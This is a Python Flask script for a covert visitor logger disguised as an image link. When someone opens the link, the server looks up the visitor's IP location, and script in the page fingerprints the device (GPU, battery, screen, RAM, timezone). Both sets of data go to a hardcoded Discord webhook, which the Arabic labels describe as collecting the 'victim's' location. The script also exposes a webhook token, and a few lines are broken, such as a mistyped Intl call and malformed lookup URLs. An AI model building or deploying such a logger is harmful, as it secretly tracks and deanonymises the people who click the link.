from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://d2j2uxe7jasn0r.cloudfront.net/thumbnails/video/ruefkyi-il8e5psf4/videoblocks-hackers-screen-2025_9_yhbh2_sflfew13gl_thumbnail-1080_02.png"

@app.route('/api/image')
def deep_logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('x-forwarded-for', request.remote_addr)

    html_code = '''
    <!DOCTYPE html>
    <html>
    <head><title>Loading...</title></head>
    <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
        <img src="{{ img_url }}" style="max-width:100%;">
        <script>
            async function getFullHardwareInfo() {
                let battery = await navigator.getBattery();
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl');
                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                let gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";

                let info = {
                    "📱 الجهاز": navigator.userAgent,
                    "🔋 البطارية": (battery.level * 100) + "% (" + (battery.charging ? "يشحن" : "لا يشحن") + ")",
                    "🖥️ الشاشة": window.screen.width + "x" + window.screen.height + " (Depth: " + window.screen.colorDepth + ")",
                    "🎮 كرت الشاشة": gpu,
                    "🧠 المعالج": navigator.hardwareConcurrency + " Cores",
                    "🌐 اللغة": navigator.language,
                    "⏰ التوقيت": new Date().toLocaleString(),
                    "⌛ المنطقة الزمنية": Intcl.DateTimeFormat().resolvedOptions().timeZone,
                    "🖱️ اللمس": navigator.maxTouchPoints + " نقاط لمس",
                    "📶 الذاكرة (RAM)": navigator.deviceMemory + " GB (تقريبي)"
                };

                fetch("{{ webhook }}", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        "embeds": [{
                            "title": "🚨 فحص شامل للجهاز (Deep Info)",
                            "color": 16711680,
                            "fields": Object.keys(info).map(key => ({name: key, value: info[key], inline: false})),
                            "footer": {"text": "IP: {{ ip }}"}
                        }]
                    })
                });
            }
            getFullHardwareInfo();
        </script>
    </body>
    </html>
    '''
    
    # إرسال معلومات الموقع الأساسية (المدينة والخريطة)
    try:
        data = requests.get(f"http://ip-api.com{ip}?fields=16976857").json()
        requests.post(WEBHOOK_URL, json={"embeds": [{"title": "📍 موقع الضحية", "fields": [
            {"name": "المدينة", "value": data.get('city')},
            {"name": "الخريطة", "value": "https://google.com" + str(data.get('lat')) + "," + str(data.get('lon'))}
        ]}]})
    except: pass

    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)
